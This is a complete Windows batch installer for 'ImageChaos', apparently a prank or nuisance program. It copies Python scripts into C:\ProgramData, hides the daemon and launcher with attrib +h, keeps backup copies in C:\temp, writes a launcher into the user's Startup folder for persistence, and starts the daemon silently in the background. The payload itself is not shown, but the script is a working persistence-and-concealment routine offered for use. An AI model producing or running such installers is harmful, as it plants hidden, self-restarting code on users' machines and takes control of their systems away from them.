@echo off
echo Installing ImageChaos...

REM Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Please install Python first.
    pause
    exit /b 1
)

REM Install dependencies
echo Installing dependencies...
pip install pywin32 Pillow

REM Create directories
if not exist "C:\ProgramData\ImageChaos" mkdir "C:\ProgramData\ImageChaos"
if not exist "C:\temp" mkdir "C:\temp"

REM Copy files
copy "chaos_script.py" "C:\ProgramData\ImageChaos\"
copy "chaos_daemon.py" "C:\ProgramData\ImageChaos\"
copy "start_chaos.bat" "C:\ProgramData\ImageChaos\"
copy "images(2).jpg" "C:\ProgramData\ImageChaos\"

REM Create backup copies
copy "chaos_daemon.py" "C:\temp\"
copy "start_chaos.bat" "C:\temp\"

REM Hide files
attrib +h "C:\ProgramData\ImageChaos\chaos_daemon.py"
attrib +h "C:\ProgramData\ImageChaos\start_chaos.bat"

REM Copy to startup
copy "C:\ProgramData\ImageChaos\start_chaos.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\"

REM Update bat content for absolute path
echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\start_chaos.bat"
echo start /B python "C:\ProgramData\ImageChaos\chaos_daemon.py" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\start_chaos.bat"

REM Start the daemon
echo Starting daemon...
start /B python "C:\ProgramData\ImageChaos\chaos_daemon.py"

echo Installation complete. The chaos will start on next login.
pause